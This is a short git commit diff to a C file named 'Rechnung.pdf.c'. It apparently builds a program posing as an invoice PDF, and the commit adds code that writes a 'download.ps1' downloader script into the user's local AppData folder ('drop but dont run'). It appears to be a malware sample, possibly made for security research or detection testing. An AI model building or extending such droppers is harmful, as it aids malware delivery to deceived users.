ec56c0054e8bd9dfafe0b770f6d33d793ecebdfa
Phillip Kemkes <Phillip.Kemkes@gdata.de>
2024-09-18 16:05:03 +0200

    drop but dont run downloader

--- Rechnung.pdf.c
+++ Rechnung.pdf.c
@@ -16,4 +16,8 @@ int main() {
     if (return_val != 0) {
         return return_val;
     }
+
+    char download_script_path[buffer_len];
+    snprintf(download_script_path, buffer_len, "%s\\download.ps1", local_app_data_path);
+    write_string(download_script_path, download_script);
 }
